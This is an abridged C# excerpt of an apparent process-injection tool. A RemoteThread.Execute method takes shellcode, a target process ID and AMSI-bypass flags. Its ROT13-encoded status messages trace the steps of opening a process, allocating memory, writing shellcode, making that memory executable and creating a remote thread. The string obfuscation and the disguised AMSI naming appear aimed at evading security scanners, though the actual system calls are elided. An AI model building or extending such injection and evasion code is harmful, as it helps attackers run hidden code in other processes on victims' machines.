    ...
    class RemoteThread
    {
        public static void Execute(byte[] shellcode, int processID, bool remoteAm51, bool forceAm51, bool debug = false)
        {
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernq) [+] AgBcraCebprff".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernq) [+] AgNyybpngrIveghnyZrzbel, CNTR_ERNQJEVGR".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernq) [+] AgJevgrIveghnyZrzbel, furyypbqr".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernq) [+] AgCebgrpgIveghnyZrzbel, CNTR_RKRPHGR_ERNQ".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
            ...
            if (ntstatus == NTSTATUS.Success)
                Console.WriteLine(new string("(ErzbgrGuernq) [+] AgPerngrGuernqRk".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));
            else
